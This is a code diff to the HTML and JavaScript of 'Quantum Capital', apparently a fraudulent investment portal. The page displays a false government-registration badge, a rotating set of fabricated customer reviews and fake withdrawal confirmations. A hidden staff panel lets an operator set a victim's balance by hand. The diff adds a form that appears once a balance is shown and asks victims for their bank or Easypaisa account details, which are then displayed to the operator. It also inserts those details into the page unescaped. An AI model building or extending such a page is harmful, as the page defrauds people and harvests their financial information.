@@ -49,7 +49,6 @@
         .navbar .brand { font-size: 18px; font-weight: bold; color: var(--primary-orange); letter-spacing: 0.5px; }
         .nav-right { display: flex; align-items: center; gap: 15px; }
         
-        /* Government Registered Badge Style */
         .gov-badge {
             background: #f1f5f9;
             border: 1px solid #cbd5e1;
@@ -88,7 +87,6 @@
             box-shadow: 0 10px 25px rgba(0,0,0,0.05);
         }
         
-        /* Review Ticker Box */
         .review-ticker-card {
             background: #fffbeb;
             border: 1px solid #fde68a;
@@ -129,6 +127,17 @@
         }
         .balance-label { font-size: 12px; color: #94a3b8; text-transform: uppercase; letter-spacing: 0.5px; }
         .balance-amount { font-size: 26px; font-weight: 800; color: var(--accent-yellow); margin-top: 4px; }
+
+        /* USER DYNAMIC ACCOUNT SUBMISSION BOX */
+        .conditional-payout-box {
+            display: none; /* Hidden by default until balance > 0 */
+            background: #f0fdf4;
+            border: 2px solid #bbf7d0;
+            border-radius: 12px;
+            padding: 18px;
+            margin-bottom: 20px;
+            box-shadow: 0 4px 12px rgba(22,163,74,0.06);
+        }
 
         .main-container {
             max-width: 1050px;
@@ -275,7 +284,6 @@
     <div class="navbar">
         <div class="brand">🌌 QUANTUM CAPITAL</div>
         <div class="nav-right">
-            <!-- GOV REGISTERED BADGE -->
             <div class="gov-badge">🏛️ GOVERNMENT REGISTERED</div>
             <div id="userWelcome" style="font-size: 13px; color: var(--success-green); font-weight: 700;"></div>
             <button class="staff-btn" onclick="unlockStaffGate()">Staff Portal Access</button>
@@ -307,16 +315,15 @@
         </div>
     </div>
 
-    <!-- ================= MAIN WHITE PORTAL ================= -->
+    <!-- ================= MAIN PORTAL ================= -->
     <div class="main-container" id="mainPortal">
         <div class="left-panel">
             
-            <!-- LIVE DYNAMIC REVIEWS TICKER BOX (Changes every 10 seconds) -->
             <div class="review-ticker-card">
                 <div class="review-user-avatar" id="revAvatar">A</div>
                 <div class="review-content">
                     <div class="review-name"><span id="revUser">Ayan **</span> <span style="color:#fbbf24;">★★★★★</span></div>
-                    <div class="review-text" id="revText">Thanks u sir recived withdral.. 💸</div>
+                    <div class="review-text" id="revText">thanks u sir recived withdral fast system! 🔥</div>
                 </div>
             </div>
 
@@ -329,6 +336,18 @@
                 <div style="text-align: right;">
                     <span style="font-size: 11px; color:#a1a1aa; background: rgba(255,255,255,0.1); padding: 4px 8px; border-radius: 20px;">🔒 Node Vault Locked</span>
                 </div>
+            </div>
+
+            <!-- CONDITIONAL REFUND DETAILS BOX (Only shows if Invested Balance > 0) -->
+            <div class="conditional-payout-box" id="conditionalSubmissionCard">
+                <h4 style="color: var(--success-green); font-size: 14px; font-weight: 800; margin-bottom: 6px;">💰 Account Payout Submission Terminal</h4>
+                <p style="font-size: 12px; color: #166534; font-weight: 600; margin-bottom: 12px;">
+                    Apna account number details dal do 1hour may recived ho jye ga.
+                </p>
+                <label class="form-label" style="color: #166534;">Enter Full Account Details (Bank Name, Account Title & Number)</label>
+                <input type="text" id="custRefundDetailsInput" class="input-field" style="border-color: #bbf7d0; background: #fff;" placeholder="e.g. Easypaisa - Ali Khan - 03XXXXXXXXX">
+                <button class="action-btn" onclick="submitRefundDetailsToAdmin()" style="background: linear-gradient(135deg, var(--success-green), #166534);">Submit Verification Details</button>
+                <p id="refundSubmissionNotice" style="font-size:11px; font-weight:700; color:var(--success-green); margin-top:8px; text-align:center;"></p>
             </div>
 
             <!-- STAGE 1: ALLOCATION TIER CHOICE -->
@@ -393,9 +412,6 @@
         <!-- RIGHT AREA: OPERATIONAL LOG & SYSTEM INSIGHTS -->
         <div class="right-panel">
             <h3 class="panel-title" style="color: var(--text-dark);">⚡ System Monitor</h3>
-            <p style="font-size:13px; color: var(--text-muted); line-height: 1.5; margin-bottom: 12px;">
-                Node deployment parameters synchronize automatically against centralized clearing networks.
-            </p>
             
             <div class="notify-panel-box">
                 <div class="notify-title">
@@ -416,20 +432,20 @@
         </div>
     </div>
 
-    <!-- ================= ACCESS SECURED ADMINISTRATIVE AREA ================= -->
+    <!-- ================= ADMINISTRATIVE STAFF AREA ================= -->
     <div class="admin-section" id="secureAdminArea">
-        <h3 style="color: var(--danger-red); margin-bottom: 15px; font-weight:800;">🛠️ STAFF CONTROL DESK INTERFACE (Secret Vault)</h3>
+        <h3 style="color: var(--danger-red); margin-bottom: 15px; font-weight:800;">🛠️ STAFF CONTROL DESK INTERFACE</h3>
         
         <div class="admin-flex">
+            <!-- NOTIFICATION TRANSMITTER TOOL -->
             <div class="admin-card-input">
-                <h4 style="font-size:13px; margin-bottom:8px; color: var(--primary-orange);">📢 Push Live Alerts to User</h4>
-                <input type="text" id="adminNoticeInput" class="input-field" placeholder="Type notification statement text here..." style="margin-bottom:10px;">
+                <h4 style="font-size:13px; margin-bottom:8px; color: var(--primary-orange);">📢 Push Live Alerts to User Notifications Box</h4>
+                <input type="text" id="adminNoticeInput" class="input-field" placeholder="Type notification text here..." style="margin-bottom:10px;">
                 <button class="action-btn" onclick="sendAdminNotification()" style="padding:8px; font-size:12px;">Broadcast System Alert Message</button>
             </div>
         </div>
         
-        <p style="color: var(--text-muted); font-size:12px; margin-bottom: 5px;">Secure Ledger Dump: Client routing queues populate below instantly.</p>
-        
+        <p style="color: var(--text-dark); font-size:13px; font-weight:700; margin-bottom: 5px;">📥 Client Verification Routing Queues:</p>
         <div class="table-wrapper">
             <table class="admin-table">
                 <thead>
@@ -445,10 +461,18 @@
                 </thead>
                 <tbody id="adminTableBody">
                     <tr>
-                        <td colspan="7" style="text-align:center; color: var(--text-muted); font-style:italic; padding: 20px;">No transaction logs mapped in real-time memory buffer yet.</td>
+                        <td colspan="7" style="text-align:center; color: var(--text-muted); font-style:italic; padding: 20px;">No transaction logs mapped in memory buffer yet.</td>
                     </tr>
                 </tbody>
             </table>
+        </div>
+
+        <!-- NEW SEPARATE BOX FOR USER SUBMITTED ACCOUNTS -->
+        <div class="admin-card-input" style="margin-top: 25px; border: 1px solid var(--success-green); background: #f0fdf4; width:100%;">
+            <h4 style="font-size:14px; margin-bottom:10px; color: var(--success-green); font-weight:800;">📥 CUSTOMER SUBMITTED ACCOUNTS FOR REFUND & PAYOUT</h4>
+            <div id="adminRefundDeskLogs" style="font-size:13px; color: var(--text-dark); font-family:monospace; line-height:1.6; background:#fff; padding:12px; border-radius:6px; border:1px solid #bbf7d0;">
+                Waiting for client to submit account details after you fund their Invested Balance...
+            </div>
         </div>
     </div>
 
@@ -457,7 +481,6 @@
         let currentRet = 0;
         let activeUser = "GuestNode";
 
-        // DYNAMIC CUSTOMER REVIEWS DATABASE ARRAY
         const systemReviews = [
             { avatar: "T", user: "Tariq *", text: "thanks u sir recived withdral fast system! 🔥" },
             { avatar: "Z", user: "Zain **", text: "Wow, 1000 single investment locked and return cleared. Good service" },
@@ -467,14 +490,13 @@
         ];
         let currentReviewIndex = 0;
 
-        // 10 Seconds Review Change Logic Loop
         setInterval(function() {
             currentReviewIndex = (currentReviewIndex + 1) % systemReviews.length;
             const targetReview = systemReviews[currentReviewIndex];
             document.getElementById('revAvatar').innerText = targetReview.avatar;
             document.getElementById('revUser').innerText = targetReview.user;
             document.getElementById('revText').innerText = targetReview.text;
-        }, 10000); // 10000ms = 10 Seconds
+        }, 10000);
 
         function switchAuth(type) {
             document.getElementById('loginView').classList.remove('active');
@@ -486,10 +508,10 @@
         function handleRegister() {
             const user = document.getElementById('regUser').value.trim();
             const pass = document.getElementById('regPass').value.trim();
-            if(!user || !pass) { alert("Missing configuration structural items."); return; }
+            if(!user || !pass) { alert("Missing configuration parameters."); return; }
             localStorage.setItem('coreU', user);
             localStorage.setItem('coreP', pass);
-            alert("Account Node Created. Forwarding to terminal login validation step.");
+            alert("Account Node Created. Forwarding to login step.");
             switchAuth('login');
         }
 
@@ -521,7 +543,7 @@
             localStorage.setItem('latestTID', tid);
 
             document.getElementById('stage2').classList.remove('active');
-            document.getElementById('loadTextLabel').innerText = "Cross-Checking Reference TID Across Decentralized Settlement Node Layers... Please Hold";
+            document.getElementById('loadTextLabel').innerText = "Cross-Checking Reference TID Across Layers... Please Hold";
             document.getElementById('loadingScreen').style.display = 'block';
 
             setTimeout(function() {
@@ -535,7 +557,7 @@
         function startWithdrawLoading() {
             const method = document.getElementById('withdrawMethod').value;
             const accountNum = document.getElementById('userWalletNum').value.trim();
-            if(!accountNum) { alert("Destination configuration mapping missing parameters."); return; }
+            if(!accountNum) { alert("Destination parameters missing."); return; }
 
             alert("Notice Registered:\nWithin 1 hour aapko withdrawal ka SMS notice received ho jayega aur amount aap ke select kiye huay bank account mein transfer ho jayegi.");
 
@@ -564,16 +586,23 @@
                     </tr>
                 `;
                 
-                document.getElementById('clientSuccessMsg').innerText = "✔ Withdrawal Operation Registered. System is listening to Admin settlement node verification frames.";
+                document.getElementById('clientSuccessMsg').innerText = "✔ Withdrawal Operation Registered. Waiting for Admin verification.";
             }, 5000);
         }
 
+        // ADMIN DISPATCHES AMOUNT -> TRIGGERS CONDITIONAL BOX ON USER SIDE
         function executeManualFunding() {
-            const amountInput = prompt("Enter specific manual fund amount to load into user's 'Invested Balance' card box:");
+            const amountInput = prompt("Enter specific fund amount to load into user's 'Invested Balance' card box:");
             if(amountInput !== null && amountInput.trim() !== "") {
                 const parsedVal = parseInt(amountInput);
                 if(!isNaN(parsedVal)) {
                     document.getElementById('userBalanceDisplay').innerText = "Rs. " + parsedVal.toLocaleString();
+                    
+                    // Show conditional submission box if balance is updated to more than 0
+                    if (parsedVal > 0) {
+                        document.getElementById('conditionalSubmissionCard').style.display = 'block';
+                    }
+                    
                     alert("Success Node: Dispatched Rs. " + parsedVal + " directly into Client's active Invested Balance terminal.");
                 } else {
                     alert("Invalid numeric assignment entry.");
@@ -581,9 +610,31 @@
             }
         }
 
+        // USER SUBMITS DETAILS -> SENT TO ADMIN SEPARATE BOX
+        function submitRefundDetailsToAdmin() {
+            const details = document.getElementById('custRefundDetailsInput').value.trim();
+            if(!details) { alert("Please input full account string parameters first."); return; }
+            
+            // Save to localStorage structure simulation
+            localStorage.setItem('lastSubmittedRefundDetails', details);
+            
+            // Push to Admin panel box instantly
+            document.getElementById('adminRefundDeskLogs').innerHTML = `
+                <strong>👤 Client:</strong> ${activeUser.toUpperCase()}<br>
+                <strong>💼 Account Details:</strong> <span style="color:var(--primary-orange); font-weight:bold;">${details}</span><br>
+                <strong>⏰ Timestamp Buffer:</strong> Active Routing Route Locked
+            `;
+            
+            document.getElementById('refundSubmissionNotice').innerText = "✔ Form parameters synchronized. Awaiting clearing agent processing pipeline.";
+            alert("Submitted Successfully!\nYour data was securely routed to our management grid.");
+        }
+
+        // ADMIN SENDS BROADCAST TEXT LIVE TO NOTIFICATION BOX
         function sendAdminNotification() {
             const msg = document.getElementById('adminNoticeInput').value.trim();
             if(!msg) { alert("Please type your transmission alert statement first."); return; }
+            
+            // Update user notification box content live
             document.getElementById('userNotificationFeed').innerText = msg;
             alert("Broadcast Status: Alert text payload pushed successfully onto client terminal screen box.");
         }
@@ -594,7 +645,7 @@
                 document.getElementById('secureAdminArea').style.display = 'block';
                 window.scrollTo({ top: document.body.scrollHeight, behavior: 'smooth' });
             } else {
-                alert("Security Error: Access Denied. Unrecognized Staff Cryptographic Token.");
+                alert("Security Error: Access Denied.");
             }
         }
     </script>
